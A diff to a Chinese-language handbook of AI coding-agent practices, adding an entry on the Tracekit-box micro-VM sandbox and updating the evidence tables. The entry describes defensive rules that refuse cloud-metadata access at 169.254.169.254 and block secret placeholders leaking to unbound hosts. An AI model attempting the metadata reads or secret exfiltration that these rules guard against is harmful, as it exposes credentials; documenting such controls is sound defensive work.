 - S：公开证据只有一次单行 bug 修复；CSV 报告和日志分析器作者自述尚未跑离线版；未测大仓库、陌生框架、复杂依赖；示例只用 Python 标准库，绕开了“依赖是否齐备”这个离线最大坑；没有本机速度、延迟、成功率、内存峰值的量化数据；单作者、单机（Mac）、单项目，工具/模型版本与部分环境变量（如 `OLLAMA_NO_CLOUD`、`qwen3.5:9b`、OpenCode 1.19.4）需在自己环境核实后再照抄；`opencode.json` 完整内容不在材料内，只有字段描述，不要凭空补全；下载体积不等于内存需求；模型可能误提 pytest 而项目用 unittest，提示词要写明确切测试命令；不能下载新包、不能上网查资料；agent 改完必须退出后自己跑原测试，不能只看自述。
 - T：证据只有一条推文和一个 AGENTS.md 示例链接；规则片段在「它专用的 cargo target」处截断，完整规则、删除命令、分支命名规则、cargo target 处理都不可见；没有前后对比、残留数量、清理耗时或失败案例，作者「最佳策略」只是主张；智能体必须能读取 AGENTS.md 且有删除 worktree/分支权限，否则规则不会生效；必须防误删未合并工作；不要凭空补命令。
+- U：v0、无 release，只能从源码构建；Mac 只能按 docs/development.md 走 Lima VM；没有 `/dev/kvm` 的机器直接跑不起来。必须自己装并常驻 Tracekit signer：daemon 启动时没有 signer 应答就退出；同机 dev signer 是 same-user，bundle 只显示 `Assurance: dev` 和 `isolation: same-user`，更高保证要把 signer 作为独立用户运行、并在另一台主机放 witness 共同签名 signer 日志。Action 里的 signer 是同一 job 内创建的 dev signer、没有 witness，`Assurance: dev` 只证明记录在 job 后未被改动，不证明 runner 本身诚实；action 会把 agent 改动应用到 runner 的 checkout，随后构建/测试等于在 runner 上运行 agent 的代码，要按 examples/claude-code-fix.yml 的三 job 形状把写 token 隔开。固定你预期的 trust 文件（提交到仓库或放 CI 外），不要直接信任 bundle 旁边附带的那个。`tkbox apply` 只能在已停止的 box 上、导出前执行，且对每个文件先问 signer；示例 demo 不 apply。网络不在 allowlist 会被挂起，无人处理 2 分钟后拒绝；云 metadata 地址 `169.254.169.254` 无论 allowlist 或人工批准都直接拒绝；明文 HTTP 把 secret 占位符带到未绑定主机会被阻断并记 `tkbox.secret.leak`；绑定主机才换入真实值并记 `tkbox.secret.use`。无外网时用 `--firecracker`/`--kernel` 传本地文件；`tkbox` 默认在自身二进制旁找 guest 二进制，也可 `--guest-dir` 指定。材料没有并发调度、任务队列、成本或性能数据；不要把它当多任务编排器。
 
 ## 证据与来源
 
@@ -727,8 +822,9 @@ T：最小试用：选一个会产生 worktree 的代码仓库，按上述方式
 | R | 《bocoboho/wardendeck》：安装、init/project create、备份 master.key、feishu setup、复用已有应用、绑定群聊、serve、聊天指令、权限模式、环境变量、审计命令、排查顺序来自 README；40 stars、MIT、自标 prototype 为报告数据 | 执行端只有 Claude Code、内核沙箱仅 macOS、Linux 需自行兜底、无定时触发、单条消息限额为报告结论；无任务质量/成功率/效率量化数据，只有过程可验证性（哈希链审计、卡片状态、doctor/status）；建议小范围试、不直接写进手册为调研结论 |
 | S | 《Coding From the Himalayas With an Offline AI Agent》：OpenCode 1.19.4、Ollama、Qwen3.5 9B、`opencode.json` 字段、Ollama 启动命令、断网验证命令、修复提示词、一行 diff、测试从 3 失败到 5 通过、样例输出 25.50、准备清单来自原文；LiveCodeBench v6/BFCL-V4 分数来自 Qwen 模型卡，非本机实测；12–16 GB 内存预算为原文引用 Voltti；预印本 OpenCode/Goose/OpenHands-SDK pass rate 与 OpenCode token 用量约 40 倍于 Goose 为原文引用，作者注明不能预测本地 Qwen3.5 9B | 只有一次单行修复成功案例，CSV 报告/日志分析器未离线跑通；无本机速度/延迟/成功率/内存峰值数据；`opencode.json` 完整内容不在材料内 |
 | T | 《@dotey: 避免 worktree 残留的最佳策略是在 AGENTS.md 里面添加规则……》：AGENTS.md 规则方向、可见规则文本（截断）、JimLiu/baocut 示例链接、推文互动数据（38 点赞、7 转发、40 回复）来自原文 | 原文没有给出删除命令、分支命名规则或 cargo target 处理细节，也没有验证数据；「最佳策略」为作者主张；3–5 个任务的试用与指标为报告建议/本手册试用设计 |
+| U | 《Cygnux-Labs/Tracekit-box》：`/dev/kvm`、`e2fsprogs`、Tracekit 1.4.2 signer、`tracekit init --dev --v2 --no-hooks`、`make linux` 构建与安装、`tkbox daemon` 首次下载 Firecracker v1.17.0 与 guest kernel 6.1.155 并 SHA-256 校验、`tkbox run/exec/approvals/approve/reject/diff/stop/export`、`--secret GH=env:GH_TOKEN@api.github.com` 语法、allowlist 挂起与 2 分钟拒绝、metadata 地址直接拒绝、`tkbox.secret.leak`/`tkbox.secret.use`、`tracekit verify --trust` 打印 `Integrity: VERIFIED.`、Action YAML 与三 job 安全形状、Python SDK 示例、fail-closed 与 `tkbox.gap` 均来自 README/报告转述；v0、无 release、需 KVM 为报告结论 | 无独立评测、用户案例、性能或成本数据；更高保证需把 signer 作为独立用户运行并在另一台主机放 witness 为 README 说明；`Assurance: dev` 不证明 runner 诚实为 README 明示；「小范围试用、不宜直接作为生产默认」为调研结论；最小试用与观察项为本手册提出 |
 
-二十条做法都没有独立的「AI 是否让结果变好了」的对照评测或基准数据；A 是记账维度，F 是验收矩阵/成本公式，J 是退出码/probe/dry-run，K 是点名命令证据，M 是工具自检数据，N 是保活/读回能力，O 是侧栏状态与 tmux 布局同步，P 是线程续聊/日志/清理/权限行为与 fan-out 能力，Q 是运行可观测性/审批/断点恢复，R 是逐工具审批/哈希链审计/内核沙箱，S 是项目自带测试的独立验收与断网越界检查，T 是 AGENTS.md 清理规则与残留检查；均非独立基准。
+二十一条做法都没有独立的「AI 是否让结果变好了」的对照评测或基准数据；A 是记账维度，F 是验收矩阵/成本公式，J 是退出码/probe/dry-run，K 是点名命令证据，M 是工具自检数据，N 是保活/读回能力，O 是侧栏状态与 tmux 布局同步，P 是线程续聊/日志/清理/权限行为与 fan-out 能力，Q 是运行可观测性/审批/断点恢复，R 是逐工具审批/哈希链审计/内核沙箱，S 是项目自带测试的独立验收与断网越界检查，T 是 AGENTS.md 清理规则与残留检查，U 是 micro-VM 隔离、密钥/网络/文件写入的签名记录与离线 verify；均非独立基准。
 
 ## 依据的调研
 
@@ -752,3 +848,4 @@ T：最小试用：选一个会产生 worktree 的代码仓库，按上述方式
 - [bocoboho/wardendeck](../research/radar/2026-10-25/6882-bocoboho-wardendeck.md)：值得一试，建议小范围试：按 README 的 init→project create→feishu setup→serve 跑通一遍，把 WardenDeck 当作 Claude Code 的“审批闸门 + 沙箱 + 审计链”控制面，验证离开终端时也能安全派活；因其自标 prototype、执行端只有 Claude Code、内核沙箱仅 macOS，暂不直接写进手册。
 - [Coding From the Himalayas With an Offline AI Agent](../research/radar/2026-10-28/7662-coding-from-the-himalayas-with-an-offline-ai-agent.md)：值得一试，先按文中步骤（OpenCode + Ollama + Qwen3.5 9B）在联网时完成一次安装和冒烟测试，再拿一个自带测试的小项目做离线修复试用，并用原始测试自行验收；之所以值得小范围试，是因为原文给出了可直接复制的命令、配置字段和离线连通性验证方法，但公开证据只有一次单行 bug 修复，还不足以直接 adopt。
 - [@dotey: 避免 worktree 残留的最佳策略是在 AGENTS.md 里面添加规则，要求 worktree 不遗留，让 Agent 自己去清理。](../research/radar/2026-10-28/7828-worktree-agents-md-worktree-agent.md)：值得一试，建议小范围试用：在 AGENTS.md 中明确要求智能体完成任务后删除 worktree 及分支；原文给出了可照抄的规则雏形，但内容被截断且无验证数据，不宜直接 adopt。
+- [Cygnux-Labs/Tracekit-box](../research/radar/2026-10-30/8511-cygnux-labs-tracekit-box.md)：值得一试，建议小范围试用：在一次性 Linux+KVM 主机或 GitHub Actions 中按 README 的 demo/action 跑一个修测试任务，导出 .tkb 并用固定 trust 文件离线验证；原因是步骤具体可复现，但项目仍是 v0、需自建 signer，默认只有 dev 级担保，不宜直接作为生产默认。
